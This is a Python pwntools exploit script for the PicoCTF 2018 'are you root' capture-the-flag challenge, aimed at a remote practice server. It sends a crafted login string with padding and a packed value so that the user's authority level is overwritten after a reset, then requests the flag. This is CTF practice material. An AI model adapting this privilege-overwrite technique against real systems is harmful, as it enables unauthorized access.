#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'PicoCTF_2018_are_you_root'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 27713

LOCAL = 0
LIB   = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():
	#li(rl())
	ru('> ')
	p = 'login' + 'B' * 0x9 +  p64(5)
	sl(p)
	ru('> ')
	sl('reset')

	p = 'login' + 'B' * 0x9 +  p64(5)
	sl(p)
	p = 'get-flag'
	#db()
	sl(p)

	

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
